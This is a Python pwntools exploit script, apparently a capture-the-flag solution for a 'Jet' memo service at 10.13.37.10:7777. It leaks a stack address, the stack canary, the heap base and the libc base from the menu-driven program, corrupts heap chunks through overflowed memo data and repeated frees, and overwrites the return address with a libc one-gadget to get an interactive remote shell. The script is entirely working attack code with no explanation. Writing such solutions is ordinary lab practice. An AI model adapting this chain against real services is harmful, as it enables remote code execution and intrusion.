from pwn import *

print("\n[\033[1;32m+\033[1;37m] Jet memo ~ GatoGamer1155\n")

if not sys.warnoptions:
    import warnings
    warnings.simplefilter("ignore")

shell = remote("10.13.37.10",7777)

def cmemo(data, answer, one_more_data=None):
    shell.sendlineafter(b"> ",b"1")
    shell.sendlineafter(b"Data: ", data)
    if answer[:3] == "yes":
        shell.sendafter(b"[yes/no] ", answer)
    else:
        shell.sendafter(b"[yes/no] ", answer)
        shell.sendafter(b"Data: ", one_more_data)

def smemo():
    shell.sendlineafter(b"> ",b"2")
    shell.recvuntil(b"Data: ")

def dmemo():
    shell.sendlineafter(b"> ",b"3")

def tout(answer):
    shell.sendlineafter(b"> ",b"4")
    shell.sendafter(b"[yes/no] ", answer)

cmemo(b"A" * 0x1f, b"no", b"A" * 0x1f)
smemo()

shell.recv(0x20)
schunk = u64(shell.recv(6) + b"\x00" * 2) - (0x7ffee7b7d4d0 - 0x7ffee7b7d3c0)
dmemo()

cmemo(b"A" * 0x28, b"no", b"A" * 0x28)
smemo()

shell.recvuntil(b"A" * 0x28)
shell.recv(1)

canary = u64(b"\x00" + shell.recv(7))

cmemo(b"A" * 0x18, b"no", b"A" * 0x18)
cmemo(b"A" * 0x18, b"no", b"A" * 0x17)
smemo()

shell.recvuntil(b"A" * 0x18)
shell.recv(1)

heap = u64(b"\x00" + shell.recv(3) + b"\x00" * 4)

cmemo(b"A" * 0x18, b"no", b"A" * 0x8 + p64(0x91) + b"A" * 0x8)
cmemo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
cmemo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
cmemo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
cmemo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8 + p64(0x31))
cmemo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)

tout(b"no\x00" + b"A" * 21 + p64(heap + 0xe0))
dmemo()

tout(b"no\x00" + b"A" * 21 + p64(heap + 0xc0))
dmemo()
smemo()

leak = u64(shell.recv(6) + b"\x00" * 2)
libc = leak - (0x7fbae5f32b78 - 0x7fbae5b6e000)

cmemo(b"A" * 0x28, b"no", b"A" * 0x10 + p64(0x0) + p64(0x21) + p64(schunk))
cmemo(p64(leak) * (0x28 // 8), b"no", b"A" * 0x28)
cmemo(b"A" * 0x8 + p64(0x21) + p64(schunk + 0x18) + b"A" * 0x8 + p64(0x21), "yes")
cmemo(b"A" * 0x8, b"no", p64(canary) + b"A" * 0x8 + p64(libc + 0x45216))

tout(b"yes\x00")
shell.sendline(b"export TERM=xterm; cd")
shell.interactive()